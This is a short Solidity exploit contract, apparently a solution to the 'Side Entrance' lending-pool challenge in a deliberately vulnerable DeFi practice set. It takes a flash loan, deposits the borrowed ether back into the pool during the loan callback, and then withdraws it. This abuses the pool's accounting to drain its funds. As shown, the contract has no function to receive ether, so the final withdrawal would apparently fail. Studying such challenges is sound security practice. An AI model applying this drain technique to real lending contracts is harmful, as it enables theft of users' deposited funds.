pragma solidity ^0.8.0;
import "@openzeppelin/contracts/utils/Address.sol";
import "hardhat/console.sol";

contract fake {
    ISideEntranceLenderPool pool;

    constructor(address _poolAddress) {
        pool = ISideEntranceLenderPool(_poolAddress);
    }

    function execute() external payable {
        pool.deposit{value: address(this).balance}();
    }

    function hacke(uint256 amount) external payable {
        console.log("amount: ", amount);
        pool.flashLoan(amount);
        pool.withdraw();
    }
}

interface ISideEntranceLenderPool {
    function flashLoan(uint256 amount) external;

    function deposit() external payable;

    function withdraw() external;
}
